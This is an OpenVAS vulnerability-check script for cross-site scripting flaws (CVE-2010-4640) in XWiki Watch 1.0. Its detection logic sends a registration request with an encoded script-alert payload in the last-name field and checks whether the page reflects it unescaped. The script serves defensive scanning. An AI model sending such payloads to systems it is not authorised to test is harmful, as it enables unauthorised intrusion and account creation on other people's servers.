##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xwiki_watch_mult_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# XWiki Watch Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site when malicious data is being viewed.
  Impact Level: Application.";
tag_affected = "XWiki Watch version 1.0";

tag_insight = "Multiple flaws are due to:
  - An  Input passed via the 'rev' parameter to 'xwiki/bin/viewrev/Main/WebHome'
    or 'xwiki/bin/view/Blog' is not properly sanitised before being returned to
    the user.
  - An Input passed via the 'register_first_name' and 'register_last_name'
    parameters to 'xwiki/bin/register/XWiki/Register' is not properly sanitised
    before being displayed to the user.";
tag_solution = "No solution or patch is available as of 05th january, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://watch.xwiki.org/xwiki/bin/view/Main/";
tag_summary = "This host is running XWiki Watch and is prone to multiple cross site
  scripting vulnerabilities.";

if(description)
{
  script_id(801564);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-01-08 10:30:18 +0100 (Sat, 08 Jan 2011)");
  script_cve_id("CVE-2010-4640");
  script_bugtraq_id(44606);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("XWiki Watch Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/68975");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42090");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/62941");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/62940");

  script_description(desc);
  script_summary("Check for cross site scripting vulnerability in XWiki Watch");
  script_category(ACT_GATHER_INFO);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

xwport = get_http_port(default:8080);
if(!get_port_state(xwport)){
  exit(0);
}

sndReq = http_get(item:"/xwiki/bin/view/Main/WebHome", port:xwport);
rcvRes = http_send_recv(port:xwport, data:sndReq);

## Confirm the application
if("XWiki - Main - WebHome" >!< rcvRes &&
   "Welcome to your XWiki Watch" >!< rcvRes){
 exit(0);
}

## Try an exploit
filename = "/xwiki/bin/register/XWiki/Register";
host = get_host_name();

authVariables ="template=XWiki.XWikiUserTemplate&register=1&register_first_name" +
               "=dingdong&register_last_name=%3Cscript%3Ealert%281111%29%3C%2Fscr" +
               "ipt%3E&xwikiname="+rand()+"&register_password=dingdong&register2_passwor" +
               "d=dingdong&register_email=dingdong";

## Construct post request
sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.4) Gecko/2008111217 Fedora/3.0.4-1.fc10 Firefox/3.0.4\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Accept-Language: en-us,en;q=0.5\r\n",
                 "Keep-Alive: 300\r\n",
                 "Connection: keep-alive\r\n",
                 "Referer: http://", host, filename, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                  authVariables);
rcvRes = http_keepalive_send_recv(port:xwport, data:sndReq);

## Check the Response
if("<script>alert(1111)</script></" >< rcvRes && "Registration successful.">< rcvRes){
    security_warning(xwport);
}
